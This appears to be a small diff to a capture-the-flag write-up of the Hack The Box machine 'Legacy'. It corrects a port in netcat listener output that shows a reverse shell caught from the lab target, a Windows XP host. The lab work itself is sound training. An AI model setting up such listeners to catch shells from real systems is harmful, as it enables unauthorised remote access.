@@ -229,7 +229,7 @@ look over at listener and we've got a shell:
 root@apollo:~/htb/legacy# nc -lvnp 42069
 Ncat: Version 7.70 ( https://nmap.org/ncat )
 Ncat: Listening on :::42069
-Ncat: Listening on 0.0.0.0:443
+Ncat: Listening on 0.0.0.0:42069
 Ncat: Connection from 10.10.10.4.
 Ncat: Connection from 10.10.10.4:1028.
 Microsoft Windows XP [Version 5.1.2600]
